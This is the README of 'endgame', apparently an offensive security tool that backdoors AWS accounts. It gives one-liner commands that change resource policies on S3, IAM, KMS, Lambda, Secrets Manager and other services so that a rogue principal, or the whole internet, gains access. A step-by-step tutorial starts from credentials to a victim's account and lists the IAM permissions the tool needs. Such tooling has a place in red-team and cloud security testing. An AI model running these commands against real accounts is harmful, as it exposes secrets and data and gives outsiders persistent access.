# endgame

Use a one-liner command to backdoor an AWS account's resources with a rogue AWS Account - or to the entire internet 😈

[![continuous-integration](https://github.com/salesforce/endgame/workflows/continuous-integration/badge.svg?)](https://github.com/salesforce/endgame/actions?query=workflow%3Acontinuous-integration)
[![Documentation Status](https://readthedocs.org/projects/endgame/badge/?version=latest)](https://endgame.readthedocs.io/en/latest/?badge=latest)
[![Join the chat at https://gitter.im/salesforce/endgame](https://badges.gitter.im/salesforce/endgame.svg)](https://gitter.im/salesforce/endgame?utm_source=badge&utm_medium=badge&utm_campaign=pr-badge&utm_content=badge)
[![Twitter](https://img.shields.io/twitter/url/https/twitter.com/kmcquade3.svg?style=social&label=Follow%20the%20author)](https://twitter.com/kmcquade3)
[![Downloads](https://pepy.tech/badge/endgame)](https://pepy.tech/project/endgame)

<p align="center">
  <img src="docs/images/endgame.gif">
</p>


**TLDR**: `endgame smash --service all` to create backdoors across your entire AWS account - either to a rogue IAM user/role or to the entire internet.

```bash
# this will ruin your day
endgame smash --service all --evil-principal "*" --dry-run
# This will show you how your day could have been ruined
endgame smash --service all --evil-principal "*" --dry-run
# Atone for your sins
endgame smash --service all --evil-principal "*" --undo
# Consider maybe atoning for your sins
endgame smash --service all --evil-principal "*" --undo --dry-run

# List resources available for exploitation
endgame list-resources --service all
# Expose specific resources
endgame expose --service s3 --name computers-were-a-mistake
```

# Supported Backdoors

`endgame` can create backdoors for resources in any of the services listed in the table below.

Note: At the time of this writing, [AWS Access Analyzer](https://docs.aws.amazon.com/IAM/latest/UserGuide/access-analyzer-resources.html) does **NOT** support auditing **11 out of the 18 services** that `endgame` attacks. Given that Access Analyzer is intended to detect this exact kind of violation, we kindly suggest to the AWS Team that they support all resources that can be attacked using `endgame`. 😊


| Backdoor Resource Type             | Support | [AWS Access Analyzer Support][1] |
|------------------------------------|---------|----------------------------------|
| ACM Private CAs                    | ✅     | ❌                               |
| CloudWatch Resource Policies       | ✅     | ❌                               |
| EBS Volume Snapshots               | ✅     | ❌                               |
| EC2 Amazon Machine Images (AMIs)   | ✅     | ❌                               |
| ECR Container Repositories         | ✅     | ❌                               |
| EFS File Systems                   | ✅     | ❌                               |
| ElasticSearch Domains              | ✅     | ❌                               |
| Glacier Vault Access Policies      | ✅     | ❌                               |
| IAM Roles                          | ✅     | ✅                               |
| KMS Keys                           | ✅     | ✅                               |
| Lambda Functions                   | ✅     | ✅                               |
| Lambda Layers                      | ✅     | ✅                               |
| RDS Snapshots                      | ✅     | ❌                               |
| S3 Buckets                         | ✅     | ✅                               |
| Secrets Manager Secrets            | ✅     | ✅                               |
| SES Sender Authorization Policies  | ✅     | ❌                               |
| SQS Queues                         | ✅     | ✅                               |
| SNS Topics                         | ✅     | ❌                               |


## Installation

* pip3

```bash
pip3 install --user endgame
```

* Homebrew (this will not work until the repository is public)

```bash
brew tap salesforce/endgame https://github.com/salesforce/endgame
brew install endgame
```

Now you should be able to execute `endgame` from command line by running `endgame --help`.

### Shell Completion

* To enable Bash completion, put this in your `~/.bashrc`:

```bash
eval "$(_ENDGAME_COMPLETE=source endgame)"
```

* To enable ZSH completion, put this in your `~/.zshrc`:

```bash
eval "$(_ENDGAME_COMPLETE=source_zsh endgame)"
```

# Tutorial

## Step 1: Setup

* First, authenticate to AWS CLI using credentials to the victim's account.

* Set the environment variables for `EVIL_PRINCIPAL` (required). Optionally, set the environment variables for `AWS_REGION` and `AWS_PROFILE`

```bash
# Set `EVIL_PRINCIPAL` environment variable to the rogue IAM User or 
# Role that you want to give access to.
export EVIL_PRINCIPAL=arn:aws:iam::999988887777:user/evil

# If you don't supply these values, these will be the defaults.
export AWS_REGION="us-east-1"
export AWS_PROFILE="default"
```

## Step 2: Create Demo Infrastructure

This program makes modifications to live AWS Infrastructure, which can vary from account to account. We have bootstrapped some of this for you using [Terraform](https://www.terraform.io/intro/index.html). **Note: This will create real AWS infrastructure and will cost you money.**

```bash
# To create the demo infrastructure
make terraform-demo
```

## Step 3: List Victim Resources

You can use the `list-resources` command to list resources in the account that you can backdoor.

* Examples:

```bash
# List IAM Roles, so you can create a backdoor via their AssumeRole policies
endgame list-resources -s iam

# List S3 buckets, so you can create a backdoor via their Bucket policies 
endgame list-resources --service s3

# List all resources across services that can be backdoored
endgame list-resources --service all
```

## Step 4: Backdoor specific resources

* Use the `--dry-run` command first to test it without modifying anything:

```bash
endgame expose --service iam --name test-resource-exposure --dry-run
```

* To create the backdoor to that resource from your rogue account, run the following:

```bash
endgame expose --service iam --name test-resource-exposure
```

Example output:

<p align="center">
  <img src="docs/images/add-myself-foreal.png">
</p>

## Step 5: Roll back changes

* If you want to atone for your sins (optional) you can use the `--undo` flag to roll back the changes.

```bash
endgame expose --service iam --name test-resource-exposure --undo
```

<p align="center">
  <img src="docs/images/add-myself-undo.png">
</p>

## Step 6: Smash your AWS Account to Pieces

* Run the following command to expose every exposable resource in your AWS account.

```bash
endgame smash --service all --dry-run
endgame smash --service all
endgame smash --service all --undo
```

## Step 7: Destroy Demo Infrastructure

* Now that you are done with the tutorial, don't forget to clean up the demo infrastructure.

```bash
# Destroy the demo infrastructure
make terraform-destroy
```

# IAM Permissions

The IAM Permissions listed below are used to create these backdoors.

You don't need **all** of these permissions to run the tool. You just need enough from each service. For example, `s3:ListAllMyBuckets`, `s3:GetBucketPolicy`, and `s3:PutBucketPolicy` are all the permissions needed to leverage this tool to expose S3 buckets.

```json
{
    "Version": "2012-10-17",
    "Statement": [
            {
            "Sid": "IAmInevitable",
            "Effect": "Allow",
            "Action": [
                "acm-pca:DeletePolicy",
                "acm-pca:GetPolicy",
                "acm-pca:ListCertificateAuthorities",
                "acm-pca:PutPolicy",
                "ec2:DescribeImageAttribute",
                "ec2:DescribeImages",
                "ec2:DescribeSnapshotAttribute",
                "ec2:DescribeSnapshots",
                "ec2:ModifySnapshotAttribute",
                "ec2:ModifyImageAttribute",
                "ecr:DescribeRepositories",
                "ecr:DeleteRepositoryPolicy",
                "ecr:GetRepositoryPolicy",
                "ecr:SetRepositoryPolicy",
                "elasticfilesystem:DescribeFileSystems",
                "elasticfilesystem:DescribeFileSystemPolicy",
                "elasticfilesystem:PutFileSystemPolicy",
                "es:DescribeElasticsearchDomainConfig",
                "es:ListDomainNames",
                "es:UpdateElasticsearchDomainConfig",
                "glacier:GetVaultAccessPolicy",
                "glacier:ListVaults",
                "glacier:SetVaultAccessPolicy",
                "iam:GetRole",
                "iam:ListRoles",
                "iam:UpdateAssumeRolePolicy",
                "kms:GetKeyPolicy",
                "kms:ListKeys",
                "kms:ListAliases",
                "kms:PutKeyPolicy",
                "lambda:AddLayerVersionPermission",
                "lambda:AddPermission",
                "lambda:GetPolicy",
                "lambda:GetLayerVersionPolicy",
                "lambda:ListFunctions",
                "lambda:ListLayers",
                "lambda:ListLayerVersions",
                "lambda:RemoveLayerVersionPermission",
                "lambda:RemovePermission",
                "logs:DescribeResourcePolicies",
                "logs:DeleteResourcePolicy",
                "logs:PutResourcePolicy",
                "rds:DescribeDbClusterSnapshots",
                "rds:DescribeDbClusterSnapshotAttributes",
                "rds:DescribeDbSnapshots",
                "rds:DescribeDbSnapshotAttributes",
                "rds:ModifyDbSnapshotAttribute",
                "rds:ModifyDbClusterSnapshotAttribute",
                "s3:GetBucketPolicy",
                "s3:ListAllMyBuckets",
                "s3:PutBucketPolicy",
                "secretsmanager:GetResourcePolicy",
                "secretsmanager:DeleteResourcePolicy",
                "secretsmanager:ListSecrets",
                "secretsmanager:PutResourcePolicy",
                "ses:DeleteIdentityPolicy",
                "ses:GetIdentityPolicies",
                "ses:ListIdentities",
                "ses:ListIdentityPolicies",
                "ses:PutIdentityPolicy",
                "sns:AddPermission",
                "sns:ListTopics",
                "sns:GetTopicAttributes",
                "sns:RemovePermission",
                "sqs:AddPermission",
                "sqs:GetQueueUrl",
                "sqs:GetQueueAttributes",
                "sqs:ListQueues",
                "sqs:RemovePermission"
            ],
            "Resource": "*"
        }
    ]
}
```

# Contributing

## Testing

### Unit tests

* Run [pytest](https://docs.pytest.org/en/stable/) with the following:

```bash
make test
```

### Security tests

* Run [bandit](https://bandit.readthedocs.io/en/latest/) with the following:

```bash
make security-test
```

### Integration tests

After making any modifications to the program, you can run a full-fledged integration test, using this program against your own test infrastructure in AWS.

* First, set your environment variables

```bash
# Set the environment variable for the username that you will create a backdoor for.
export EVIL_PRINCIPAL="arn:aws:iam::999988887777:user/evil"
export AWS_REGION="us-east-1"
export AWS_PROFILE="default"
```

* Then run the full-fledged integration test:

```bash
make integration-test
```

This does the following:
* Sets up your local dev environment (see `setup-dev`) in the `Makefile`
* Creates the Terraform infrastructure (see `terraform-demo` in the `Makefile`)
* Runs `list-resources`, `exploit --dry-run`, and `expose` against this live infrastructure
* Destroys the Terraform infrastructure (see `terraform-destroy` in the `Makefile`)

Note that the `expose` command will not expose the resources to the world - it will only expose them to your rogue user, not to the world.

# References

* [AWS Access Analyzer Supported Resources](https://docs.aws.amazon.com/IAM/latest/UserGuide/access-analyzer-resources.html)
* [AWS Exposable Resources](https://github.com/SummitRoute/aws_exposable_resources)
* [Moto: A library that allows you to easily mock out tests based on AWS Infrastructure](http://docs.getmoto.org/en/latest/docs/moto_apis.html)

[1]: https://docs.aws.amazon.com/IAM/latest/UserGuide/access-analyzer-resources.html
